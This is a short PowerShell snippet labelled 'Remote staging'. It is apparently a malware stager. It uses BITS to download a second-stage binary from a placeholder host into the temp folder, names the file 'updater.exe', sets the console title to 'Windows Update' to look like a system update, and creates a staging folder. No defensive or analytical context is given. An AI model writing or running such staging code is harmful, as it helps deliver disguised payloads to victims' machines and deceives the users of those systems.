
# Remote staging
Start-BitsTransfer -Source "https://example.net/stage2.bin" -Destination "$env:TEMP\updater.exe"
$Host.UI.RawUI.WindowTitle = "Windows Update"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
